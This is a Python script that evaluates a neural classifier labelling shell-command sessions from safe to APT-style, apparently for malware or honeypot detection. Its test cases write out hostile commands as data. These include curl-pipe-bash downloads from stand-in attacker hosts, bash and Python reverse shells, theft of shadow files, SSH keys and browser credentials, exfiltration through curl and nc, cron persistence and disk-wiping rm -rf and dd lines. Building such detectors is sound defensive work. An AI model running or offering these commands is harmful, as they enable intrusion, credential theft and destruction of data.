"""
Evaluate Neural Model with MITRE Features.

This script properly evaluates the trained model by computing MITRE features
for test cases, rather than using zeroed feature vectors.

The v6 model achieved 99.7% validation accuracy but only 31.8% on hand-crafted
test cases because those were evaluated with zero structured features.
"""

import sys
import pickle
import torch
import numpy as np
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))

from core.mitre.session_annotator import annotate_session, get_mitre_feature_columns

# =============================================================================
# Configuration
# =============================================================================

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']

MITRE_COLS = get_mitre_feature_columns()  # 21 numeric features

# Binary feature columns (79) - must match training
BINARY_COLS = [
    'triage_file_size', 'triage_entropy', 'triage_priority',
    'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
    'triage_is_dll', 'triage_is_static', 'triage_score_mining',
    'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
    'ghidra_function_count', 'ghidra_total_instructions', 'ghidra_total_basic_blocks',
    'ghidra_max_function_size', 'ghidra_avg_callers', 'ghidra_max_callers',
    'ghidra_mining_pool_count', 'ghidra_crypto_wallet_count', 'ghidra_ip_count',
    'ghidra_url_count', 'ghidra_shell_cmd_count', 'ghidra_file_path_count',
    'ghidra_imports_file_io', 'ghidra_imports_process', 'ghidra_imports_network',
    'ghidra_imports_crypto', 'ghidra_imports_evasion', 'ghidra_has_aes_sbox',
    'ghidra_has_sha256_constants', 'ghidra_has_rc4_state', 'ghidra_has_xor_loop',
    'ghidra_go_user_functions', 'ghidra_go_runtime_functions',
    'angr_basic_blocks', 'angr_edges', 'angr_functions_recovered',
    'angr_cyclomatic_complexity', 'angr_function_count', 'angr_user_functions_listed',
    'angr_syscalls_network', 'angr_syscalls_file_io', 'angr_syscalls_process',
    'angr_syscalls_memory', 'angr_ip_count', 'angr_url_count',
    'angr_mining_indicator_count', 'angr_shell_cmd_count', 'angr_has_network',
    'angr_has_file_manipulation', 'angr_has_process_control', 'angr_has_crypto',
    'angr_has_mining', 'angr_has_persistence', 'angr_has_evasion',
    'angr_has_shell_execution', 'angr_complexity_tier', 'angr_is_partial',
    'angr_loaded_as_blob',
    'script_line_count', 'script_url_count', 'script_download_count',
    'script_arch_count', 'script_is_downloader', 'script_is_multi_arch',
    'script_is_miner', 'script_has_persistence', 'script_has_anti_forensics',
    'has_ghidra_results', 'has_angr_results', 'has_script_results',
    'deep_func_ratio_angr_ghidra', 'deep_mining_signal_count',
    'deep_total_network_indicators', 'deep_total_crypto_indicators',
    'deep_max_complexity', 'deep_total_evasion_indicators', 'deep_is_go_consensus',
]

STRUCTURED_DIM = len(MITRE_COLS) + len(BINARY_COLS)  # 21 + 79 = 100


# =============================================================================
# Test Cases
# =============================================================================

DIVERSE_TEST_CASES = [
    # Safe
    {"commands": "ls -la; pwd; whoami", "label": 0, "name": "Safe: basic commands"},
    {"commands": "uname -a; hostname; date", "label": 0, "name": "Safe: system info"},
    {"commands": "cat README.md; head -10 file.txt", "label": 0, "name": "Safe: file reading"},
    
    # Recon
    {"commands": "nmap -sS -p 22,80,443 192.168.1.1", "label": 1, "name": "Recon: nmap scan"},
    {"commands": "netstat -tulpn; ss -antp; arp -a", "label": 1, "name": "Recon: network enum"},
    {"commands": "cat /etc/passwd; find / -perm -4000 2>/dev/null", "label": 1, "name": "Recon: user/suid enum"},
    {"commands": "ps aux; top -bn1; who; w; last", "label": 1, "name": "Recon: process/user enum"},
    
    # Downloader
    {"commands": "wget http://evil.com/bot.sh; chmod +x bot.sh; ./bot.sh", "label": 2, "name": "Downloader: wget exec"},
    {"commands": "curl -sL http://c2.attacker.net/payload | bash", "label": 2, "name": "Downloader: curl pipe bash"},
    {"commands": "cd /tmp; wget http://192.168.1.100/xmrig; chmod 777 xmrig; ./xmrig", "label": 2, "name": "Downloader: miner"},
    
    # Exploit
    {"commands": "cat /etc/shadow; unshadow /etc/passwd /etc/shadow > hashes.txt", "label": 3, "name": "Exploit: credential theft"},
    {"commands": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "label": 3, "name": "Exploit: reverse shell"},
    {"commands": "cat ~/.ssh/id_rsa; cat ~/.bash_history | grep -i password", "label": 3, "name": "Exploit: key/history theft"},
    {"commands": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": 3, "name": "Exploit: python revshell"},
    
    # Destructive
    {"commands": "rm -rf /; rm -rf /*", "label": 4, "name": "Destructive: rm -rf /"},
    {"commands": "dd if=/dev/zero of=/dev/sda bs=1M", "label": 4, "name": "Destructive: disk wipe"},
    {"commands": "rm -rf /var/log/*; history -c; cat /dev/null > ~/.bash_history", "label": 4, "name": "Destructive: log/history wipe"},
    {"commands": "shred -u /etc/passwd /etc/shadow; rm -rf /home/*", "label": 4, "name": "Destructive: shred files"},
    {"commands": "cd ~; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAA...' >> .ssh/authorized_keys", "label": 4, "name": "Destructive: SSH backdoor"},
    
    # APT
    {"commands": "uname -a; id; wget http://c2.evil.com/implant -O /tmp/.sys; chmod +x /tmp/.sys; /tmp/.sys &; echo '* * * * * /tmp/.sys' >> /var/spool/cron/root; cat /etc/shadow > /tmp/.c; curl -X POST http://c2.evil.com/exfil -d @/tmp/.c; rm /tmp/.c; history -c", "label": 5, "name": "APT: full kill chain"},
    {"commands": "hostname; curl -s http://c2/backdoor -o /tmp/.bd; chmod +x /tmp/.bd; nohup /tmp/.bd &; cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc; cat /etc/shadow | base64 | curl -X POST http://c2/data -d @-", "label": 5, "name": "APT: persistence + exfil"},
    {"commands": "ps aux; netstat -antp; wget http://evil.com/kit.tar.gz -O /tmp/k.tgz; tar xzf /tmp/k.tgz -C /opt; echo '0 */6 * * * /opt/kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins' > /tmp/.b; nc evil.com 443 < /tmp/.b; rm -rf /tmp/k.tgz /tmp/.b", "label": 5, "name": "APT: toolkit + browser creds"},
]


def compute_mitre_features(commands: str) -> np.ndarray:
    """Compute MITRE features for a command string."""
    # Split commands by common separators
    cmd_list = []
    for sep in [';', '&&', '||', '\n']:
        if sep in commands:
            cmd_list = [c.strip() for c in commands.replace('&&', ';').replace('||', ';').split(';')]
            break
    if not cmd_list:
        cmd_list = [commands]
    
    # Annotate with MITRE
    annotation = annotate_session(cmd_list)
    
    # Flatten to dict
    from core.mitre.session_annotator import annotation_to_flat_dict
    flat = annotation_to_flat_dict(annotation)
    
    # Extract numeric features in order
    mitre_vals = []
    for col in MITRE_COLS:
        val = flat.get(col, 0)
        if isinstance(val, str):
            val = 0  # Skip string columns
        mitre_vals.append(float(val))
    
    return np.array(mitre_vals, dtype=np.float32)


def compute_structured_features(commands: str) -> np.ndarray:
    """Compute full structured features (MITRE + zeroed binary features)."""
    mitre = compute_mitre_features(commands)
    binary = np.zeros(len(BINARY_COLS), dtype=np.float32)  # No binary features for test cases
    return np.concatenate([mitre, binary])


def load_model(model_path: Path):
    """Load the saved model bundle."""
    with open(model_path, 'rb') as f:
        bundle = pickle.load(f)
    
    model = bundle['model']
    tokenizer = bundle['tokenizer']
    
    return model, tokenizer


def evaluate_test_cases(model, tokenizer, device, use_mitre=True):
    """Evaluate model on diverse test cases."""
    print("\n" + "=" * 80)
    print(f"EVALUATION {'WITH' if use_mitre else 'WITHOUT'} MITRE FEATURES")
    print("=" * 80)
    
    model.eval()
    model = model.to(device)
    correct = 0
    results = []
    
    for tc in DIVERSE_TEST_CASES:
        # Tokenize commands
        encoded, lengths = tokenizer.encode_batch([tc['commands']])
        encoded = encoded.to(device)
        lengths = lengths.to(device)
        
        # Compute structured features
        if use_mitre:
            structured = compute_structured_features(tc['commands'])
            structured = torch.tensor(structured, dtype=torch.float32).unsqueeze(0).to(device)
        else:
            structured = torch.zeros(1, STRUCTURED_DIM, dtype=torch.float32).to(device)
        
        # Predict
        with torch.no_grad():
            preds, probs = model.predict(encoded, structured, lengths)
        
        pred_label = preds[0].item()
        confidence = probs[0][pred_label].item()
        expected = tc['label']
        
        is_correct = pred_label == expected
        if is_correct:
            correct += 1
        
        status = "OK" if is_correct else "FAIL"
        print(f"\n[{status}] {tc['name']}")
        print(f"  Expected: {CLASS_NAMES[expected]}, Got: {CLASS_NAMES[pred_label]} ({confidence*100:.1f}%)")
        
        if use_mitre:
            mitre = compute_mitre_features(tc['commands'])
            mitre_nonzero = [(MITRE_COLS[i], mitre[i]) for i in range(len(mitre)) if mitre[i] > 0]
            if mitre_nonzero:
                print(f"  MITRE: {mitre_nonzero[:5]}...")
        
        if not is_correct:
            print(f"  Commands: {tc['commands'][:80]}...")
        
        results.append({
            'name': tc['name'],
            'expected': CLASS_NAMES[expected],
            'predicted': CLASS_NAMES[pred_label],
            'confidence': confidence,
            'correct': is_correct
        })
    
    accuracy = correct / len(DIVERSE_TEST_CASES) * 100
    print(f"\n{'=' * 80}")
    print(f"Test Case Accuracy: {correct}/{len(DIVERSE_TEST_CASES)} ({accuracy:.1f}%)")
    print("=" * 80)
    
    return results, accuracy


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Evaluate neural model')
    parser.add_argument('--model', type=str, default='brain_v6_diverse.pkl',
                        help='Model filename in models/ directory')
    parser.add_argument('--no-mitre', action='store_true',
                        help='Evaluate without MITRE features (zeroed)')
    args = parser.parse_args()
    
    model_path = PROJECT_ROOT / "models" / args.model
    print(f"Loading model from {model_path}...")
    
    if not model_path.exists():
        print(f"ERROR: Model not found at {model_path}")
        return
    
    model, tokenizer = load_model(model_path)
    
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print(f"Device: {device}")
    
    # Evaluate WITH MITRE features
    results_with, acc_with = evaluate_test_cases(model, tokenizer, device, use_mitre=True)
    
    if args.no_mitre:
        # Also evaluate WITHOUT MITRE features for comparison
        results_without, acc_without = evaluate_test_cases(model, tokenizer, device, use_mitre=False)
        
        print("\n" + "=" * 80)
        print("COMPARISON")
        print("=" * 80)
        print(f"  With MITRE features:    {acc_with:.1f}%")
        print(f"  Without MITRE features: {acc_without:.1f}%")


if __name__ == '__main__':
    main()
